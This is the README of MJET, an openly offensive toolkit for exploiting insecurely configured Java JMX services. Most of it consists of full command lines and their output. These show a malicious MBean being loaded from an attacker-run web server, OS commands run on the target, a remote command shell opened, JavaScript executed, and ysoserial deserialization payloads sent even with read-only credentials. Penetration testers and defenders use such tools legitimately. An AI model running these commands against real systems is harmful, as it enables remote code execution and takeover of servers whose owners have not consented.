# MJET by MOGWAI LABS

MOGWAI LABS JMX Exploitation Toolkit

MJET is a fork of [sjet](https://github.com/siberas/sjet/), which was developed by siberas but is no longer actively maintained. MJET is maintained by the MOGWAI LABS team which also provided most of the original sjet codebase.


MJET allows an easy exploitation of insecure configured JMX services. Additional background
information can be found [here](https://www.optiv.com/blog/exploiting-jmx-rmi) and [here](https://www.owasp.org/images/c/c1/JMX_-_Java_Management_Extensions_-_Hans-Martin_Muench.pdf).

## Prerequisites

* [Jython 2.7](https://www.jython.org/)
* [Ysoserial](https://github.com/frohoff/ysoserial) (for exploiting deserialisation vulnerabilities via JMX)
* [opendmk_jmxremote_optional_jar-1.0-b01-ea.jar](https://mvnrepository.com/artifact/org.glassfish.external/opendmk_jmxremote_optional_jar/1.0-b01-ea) (to support the alternative JMX Message Protocol (JMXMP))

## Usage

MJET implements a CLI interface (using [argparse](https://docs.python.org/3/library/argparse.html)):

```
jython mjet.py targetHost targetPort password MODE (modeOptions)
```
Where

* **targetHost** -  the target IP address
* **targetPort** - the target port where JMX is running
* **MODE** - the script mode
* **modeOptions** - the options for the mode selected

Optional arguments (if JMX authentication is enabled):
* **--jmxrole** - the username
* **--jmxpassword** - the password

Optional argument (if target uses JMXMP):
* **--jmxmp** - no arguments

### Modes and modeOptions

* **install** - installs the payload in the current target
  * *password* - the password that should be set after successful installation
  * *payload_url* - full URL to load the payload
  * *payload_port* - port to load the payload
* **uninstall** - uninstalls the payload from the current target
* **changepw** -  change the password on a already deployed payload
  * *password* - the password to access the installed MBean
  * *newpass* - The new password
* **command** -  runs the command *CMD* in the targetHost
  * *password* - the password to access the installed MBean
  * *CMD* - the command to run
* **shell** - starts a simple shell in targetHost (with the limitations of java's Runtime.exec())
  * *password* - the password to access the installed MBean
* **javascript** - runs a javascript file *FILENAME* in the targetHost
  * *password* - the password to access the installed MBean
  * *FILENAME* - the javascript to be run
* **deserialize** - send a ysoserial payload to the target
  * *gadget* - gadget as provided by ysoserial, e.g., CommonsCollections6
  * *cmd* - command to be executed
* **webserver** - just run the MLET web server
  * *payload_url* - full URL to load the payload
  * *payload_port* - port to load the payload

## Examples


### Installing the payload MBean on a vulnerable JMX service

In the following example, the vulnerable JMX service runs on 10.165.188.23 port 2222, the attacker has
the IP address 10.165.188.1. The JMX service will connect to the web service of the attacker to download
the payload jar file. MJET will start the necessary web service on port 8000.

After the successful installation of the MBean, the default password is changed to the password that was provided
at the command line ("super_secret").

```
h0ng10@rocksteady ~/w/mjet> java -jar jython-standalone-2.7.0.jar mjet.py 10.165.188.23 2222 install super_secret http://10.165.188.1:8000 8000

MJET - MOGWAI LABS JMX Exploitation Toolkit
===========================================
[+] Starting webserver at port 8000
[+] Connecting to: service:jmx:rmi:///jndi/rmi://10.165.188.23:2222/jmxrmi
[+] Connected: rmi://10.165.188.1  1
[+] Loaded javax.management.loading.MLet
[+] Loading malicious MBean from http://10.165.188.1:8000
[+] Invoking: javax.management.loading.MLet.getMBeansFromURL
10.165.188.23 - - [26/Apr/2019 21:50:37] "GET / HTTP/1.1" 200 -
[+] Successfully loaded MBeanMogwaiLabs:name=payload,id=1
[+] Changing default password...
[+] Loaded de.mogwailabs.MogwaiLabsMJET.MogwaiLabsPayload
[+] Successfully changed password
[+] Done
h0ng10@rocksteady ~/w/mjet> 
```

Installation with JMX credentials (also needs a weak configuration of the server):
```
h0ng10@rocksteady:~/mjet$ jython mjet.py 192.168.11.136 9991 super_secret install http://192.168.11.132:8000 8000 --jmxrole JMXUSER --jmxpassword JMXPASSWORD
mJET - MOGWAI LABS JMX Exploitation Toolkit
=======================================
[+] Starting webserver at port 8000
[+] Connecting to: service:jmx:rmi:///jndi/rmi://192.168.11.136:9991/jmxrmi
[+] Using credentials: JMXUSER / JMXPASSWORD
[+] Connected: rmi://192.168.11.132  1
[+] Loaded javax.management.loading.MLet
[+] Loading malicious MBean from http://192.168.11.132:8000
[+] Invoking: javax.management.loading.MLet.getMBeansFromURL
192.168.11.136 - - [22/Aug/2017 22:38:00] "GET / HTTP/1.1" 200 -
192.168.11.136 - - [22/Aug/2017 22:38:00] "GET /mogwailabs_mlet.jar HTTP/1.1" 200 -
[+] Successfully loaded MBeanMogwaiLabs:name=payload,id=1
[+] Changing default password...
[+] Loaded de.mogwailabs.mlet.MogwaiLabsPayload
[+] Successfully changed password

h0ng10@rocksteady:~/mjet$
```

### Running the command 'ls -la' in a Linux target:

After the payload was installed, we can use it to execute OS commands on the target.

```
h0ng10@rocksteady ~/w/mjet> jython mjet.py 10.165.188.23 2222 command super_secret "ls -la"

MJET - MOGWAI LABS JMX Exploitation Toolkit
===========================================
[+] Connecting to: service:jmx:rmi:///jndi/rmi://10.165.188.23:2222/jmxrmi
[+] Connected: rmi://10.165.188.1  4
[+] Loaded de.mogwailabs.MogwaiLabsMJET.MogwaiLabsPayload
[+] Executing command: ls -la
total 20
drwxr-xr-x  5 root    root    4096 Apr 26 11:12 .
drwxr-xr-x 33 root    root    4096 Apr 10 13:54 ..
lrwxrwxrwx  1 root    root      12 Aug 13  2018 conf -> /etc/tomcat8
drwxr-xr-x  2 tomcat8 tomcat8 4096 Aug 13  2018 lib
lrwxrwxrwx  1 root    root      17 Aug 13  2018 logs -> ../../log/tomcat8
drwxr-xr-x  2 root    root    4096 Apr 26 11:12 policy
drwxrwxr-x  3 tomcat8 tomcat8 4096 Apr 10 13:54 webapps
lrwxrwxrwx  1 root    root      19 Aug 13  2018 work -> ../../cache/tomcat8


[+] Done
h0ng10@rocksteady ~/w/mjet>
```
### Running in shell mode

If you don't want to load Java for every command, you can use the "shell mode"
to get a limited command shell.

```
h0ng10@rocksteady ~/w/mjet> jython mjet.py 10.165.188.23 2222 shell super_secret 

MJET - MOGWAI LABS JMX Exploitation Toolkit
===========================================
[+] Connecting to: service:jmx:rmi:///jndi/rmi://10.165.188.23:2222/jmxrmi
[+] Connected: rmi://10.165.188.1  5
[+] Use command 'exit_shell' to exit the shell
>>> ls -la
[+] Loaded de.mogwailabs.MogwaiLabsMJET.MogwaiLabsPayload
[+] Executing command: ls -la
total 20
drwxr-xr-x  5 root    root    4096 Apr 26 11:12 .
drwxr-xr-x 33 root    root    4096 Apr 10 13:54 ..
lrwxrwxrwx  1 root    root      12 Aug 13  2018 conf -> /etc/tomcat8
drwxr-xr-x  2 tomcat8 tomcat8 4096 Aug 13  2018 lib
lrwxrwxrwx  1 root    root      17 Aug 13  2018 logs -> ../../log/tomcat8
drwxr-xr-x  2 root    root    4096 Apr 26 11:12 policy
drwxrwxr-x  3 tomcat8 tomcat8 4096 Apr 10 13:54 webapps
lrwxrwxrwx  1 root    root      19 Aug 13  2018 work -> ../../cache/tomcat8


>>> pwd
[+] Loaded de.mogwailabs.MogwaiLabsMJET.MogwaiLabsPayload
[+] Executing command: pwd
/var/lib/tomcat8


>>> exit_shell
[+] Done
h0ng10@rocksteady ~/w/mjet> 

```

### Invoke a JavaScript payload on a target:

The example script "javaproperties.js" displays the Java properties of the vulnerable
service. It can be invoked as follows:

```
h0ng10@rocksteady ~/w/mjet> jython mjet.py 10.165.188.23 2222 javascript super_secret scripts/javaproperties.js 

MJET - MOGWAI LABS JMX Exploitation Toolkit
===========================================
[+] Connecting to: service:jmx:rmi:///jndi/rmi://10.165.188.23:2222/jmxrmi
[+] Connected: rmi://10.165.188.1  6
[+] Loaded de.mogwailabs.MogwaiLabsMJET.MogwaiLabsPayload
[+] Executing script
awt.toolkit=sun.awt.X11.XToolkit
java.specification.version=11
sun.cpu.isalist=
sun.jnu.encoding=UTF-8
java.class.path=/usr/share/tomcat8/bin/bootstrap.jar:/usr/share/tomcat8/bin/tomcat-juli.jar
com.sun.management.jmxremote.authenticate=false
java.vm.vendor=Oracle Corporation
sun.arch.data.model=64
...


[+] Done

```

### Change the password

Change the existing password ("super_secret") to "this-is-the-new-password":

```
h0ng10@rocksteady ~/w/mjet> jython mjet.py 10.165.188.23 2222 changepw super_secret this-is-the-new-password

MJET - MOGWAI LABS JMX Exploitation Toolkit
===========================================
[+] Connecting to: service:jmx:rmi:///jndi/rmi://10.165.188.23:2222/jmxrmi
[+] Connected: rmi://10.165.188.1  7
[+] Loaded de.mogwailabs.MogwaiLabsMJET.MogwaiLabsPayload
[+] Successfully changed password
[+] Done

```

### Uninstall the payload MBean from the target


Uninstall the payload MBean 'MogwaiLabs' from the target:

```
h0ng10@rocksteady ~/w/mjet> jython mjet.py 10.165.188.23 2222 uninstall

MJET - MOGWAI LABS JMX Exploitation Toolkit
===========================================
[+] Connecting to: service:jmx:rmi:///jndi/rmi://10.165.188.23:2222/jmxrmi
[+] Connected: rmi://10.165.188.1  8
[+] MBean correctly uninstalled
[+] Done

```

### Exploit Java deserialization with ysoserial

Exploit Java deserialization with ysoserial on target:
The file ysoserial.jar must be present in the MJET directory.
You can select any ysoserial payload as you like, similar to the original ysoserial calls.

This attack even works if JMX authentication is enabled and the user has "readonly" permissions.

```
h0ng10@rocksteady ~/w/mjet> jython mjet.py --jmxrole user --jmxpassword userpassword 10.165.188.23 2222 deserialize CommonsCollections6 "touch /tmp/xxx"

MJET - MOGWAI LABS JMX Exploitation Toolkit
===========================================
[+] Added ysoserial API capacities
[+] Connecting to: service:jmx:rmi:///jndi/rmi://10.165.188.23:2222/jmxrmi
[+] Using credentials: user / userpassword
[+] Connected: rmi://10.165.188.1 user 21
[+] Loaded sun.management.ManagementFactoryHelper$PlatformLoggingImpl
[+] Passing ysoserial object as parameter to getLoggerLevel(String loglevel)
[+] Got an access denied exception - this is expected

[+] Done

```

### Webserver only mode

It is also possible to just run the web server that provides the MLET code and the JAR file with the payload MBean
```
h0ng10@rocksteady ~/w/mjet> jython mjet.py 10.165.188.23 2222 webserver http:/xxxx/xxxx 8000

MJET - MOGWAI LABS JMX Exploitation Toolkit
===========================================
[+] Starting webserver at port 8000
[+] Press Enter to stop the service

```

### JMX message protocol

Download [opendmk_jmxremote_optional_jar-1.0-b01-ea.jar](https://mvnrepository.com/artifact/org.glassfish.external/opendmk_jmxremote_optional_jar/1.0-b01-ea) and mopve it into the jars directory. You need to add it to the classpath via `java -cp`.

```bash
java -cp jython.jar:jars/opendmk_jmxremote_optional_jar-1.0-b01-ea.jar org.python.util.jython mjet.py shell mypass
```

## Contributing

Feel free to contribute.

## Authors

* **Hans-Martin Münch** - *Initial idea and work* - [h0ng10](https://twitter.com/h0ng10)
* **Patricio Reller** - *CLI and extra options* - [preller](https://github.com/preller)
* **Ben Campbell** - *Several improvements* - [Meatballs1](https://github.com/Meatballs1)
* **Arnim Rupp** - *Authentication support*
* **Sebastian Kindler** - *Deserialization support*
* **Karsten Zeides** - *JMX Message Protocol support* [zeides](https://github.com/zeides)

See also the list of [contributors](https://github.com/mogwailabs/sjet/graphs/contributors) who participated in this project.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
